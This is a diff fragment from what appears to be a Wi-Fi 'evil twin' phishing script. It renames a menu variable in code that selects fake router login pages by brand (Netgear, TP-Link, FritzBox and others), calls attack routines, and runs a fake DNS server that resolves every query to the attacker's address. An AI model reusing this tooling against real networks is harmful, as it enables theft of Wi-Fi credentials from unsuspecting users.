                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_HE
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_HE
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_HE
@@ -2598,7 +2680,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = 23 ]; then
+			elif [ "$webconf" = 23 ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_TH
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_TH
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_TH
@@ -2612,7 +2694,7 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-            elif [ "$fluxass" = 24 ]; then
+            elif [ "$webconf" = 24 ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PT_BR
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PT_BR
                                 DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_PT_BR
@@ -2626,74 +2708,75 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "25" ]; then
+			elif [ "$webconf" = "25" ]; then
 				BELKIN
 				break
 
 
-			elif [ "$fluxass" = "26" ]; then
+			elif [ "$webconf" = "26" ]; then
 				NETGEAR
 				break
 
-			elif [ "$fluxass" = "27" ]; then
+			elif [ "$webconf" = "27" ]; then
 				HUAWEI
 				break
 
-			elif [ "$fluxass" = "28" ]; then
+			elif [ "$webconf" = "28" ]; then
 				VERIZON
 				break
 
-			elif [ "$fluxass" = "29" ]; then
+			elif [ "$webconf" = "29" ]; then
 				NETGEAR2
 				break
 
-			elif [ "$fluxass" = "30" ]; then
+			elif [ "$webconf" = "30" ]; then
 				ARRIS2
 				break
 
-			elif [ "$fluxass" = "31" ]; then
+			elif [ "$webconf" = "31" ]; then
 				VODAFONE
 				break
 
-			elif [ "$fluxass" = "32" ]; then
+			elif [ "$webconf" = "32" ]; then
 				TPLINK
 				break
 
-			elif [ "$fluxass" = "33" ]; then
+			elif [ "$webconf" = "33" ]; then
 				TPLINK_ITA
 				break
 
-			elif [ "$fluxass" = "34" ]; then
+			elif [ "$webconf" = "34" ]; then
 				ZIGGO_NL
 				break
 
-			elif [ "$fluxass" = "35" ]; then
+			elif [ "$webconf" = "35" ]; then
 				KPN_NL
 				break
 
-            elif [ "$fluxass" = "36" ]; then
+            elif [ "$webconf" = "36" ]; then
                 ZIGGO2016_NL
                 break
 
-      		elif [ "$fluxass" = "37" ]; then
+      		elif [ "$webconf" = "37" ]; then
 				FRITZBOX_DE
 				break
 
-		    elif [ "$fluxass" = "38" ]; then
+		    elif [ "$webconf" = "38" ]; then
 				FRITZBOX_ENG
 				break
 
-			elif [ "$fluxass" = "39" ]; then
+			elif [ "$webconf" = "39" ]; then
 				GENEXIS_DE
 				break
 
-			elif [ "$fluxass" = "40" ]; then
+			elif [ "$webconf" = "40" ]; then
 				conditional_clear
 				webinterface
 				break
 			fi
 
 	done
+fi
 	preattack
 	attack
 }
@@ -2864,7 +2947,7 @@ class DNSQuery:
 
 if __name__ == '__main__':
   ip='$IP'
-  print 'pyminifakeDfluxassNS:: dom.query. 60 IN A %s' % ip
+  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('',53))
